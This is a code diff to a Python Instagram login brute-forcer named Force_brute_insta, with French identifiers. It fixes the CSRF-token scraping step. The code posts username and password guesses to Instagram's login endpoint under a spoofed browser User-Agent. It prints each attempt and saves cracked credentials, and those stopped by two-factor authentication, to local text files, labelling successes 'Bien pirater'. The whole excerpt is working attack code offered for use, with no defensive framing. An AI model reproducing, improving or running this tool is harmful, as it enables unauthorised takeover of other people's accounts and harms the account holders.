@@ -226,9 +226,11 @@ class Force_brute_insta(object):
             'optIntoOneTap': 'false'
         }
         with requests.Session() as sauve:
-            _requete = sauve.get(_lien_connexion)
-            _csrf_jeton = re.findall(_requete+"csrf_token\":\"(.*?)\"", _requete.text)[0]
-            _reqs = sauve.post(_url_connexion, data=_charge_utile, headers={
+            #_requete = sauve.get(_lien_connexion)
+            r = sauve.get(_lien_connexion)
+            _csrf_jeton = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
+            #_csrf_jeton = re.findall(_requete"csrf_token\":\"(.*?)\"", _requete.text)[0]
+            reqs = sauve.post(_url_connexion, data=_charge_utile, headers={
                 "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                 "X-Requested-With": "XMLHttpRequest",
                 "Referer": "https://www.instagram.com/accounts/login/",
@@ -236,11 +238,11 @@ class Force_brute_insta(object):
             })
             #print(f"{utilisateur}:{pwd}\n╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬")
             print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m " + utilisateur + "\033[1;91m :\033[1;93m " + pwd + "\033[1;97m\n╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬")
-            if "authenticated': true" in _reqs.text:
+            if "authenticated': true" in reqs.text:
                 print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m " + utilisateur + "\033[1;91m: \033[1;96m" + pwd + "\033[1;91m -->\033[1;97m Bien pirater")
                 with open("faxelm.txt", "a") as saves:
                     saves.write("#Faxel\n" + utilisateur + ":" + pwd + "\n")
-            elif "two_factor_required" in _reqs.text:   
+            elif "two_factor_required" in reqs.text:   
                 print("\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m "+ utilisateur + "\033[1;91m: \033[1;93m" + pwd + "\033[1;91m -->\033[1;97m Bon il faut vérifier")
                 with open("Faxelh.txt", "a") as sauves:
                     sauves.write("#Faxel\n" + utilisateur + ":" + pwd + "\n")
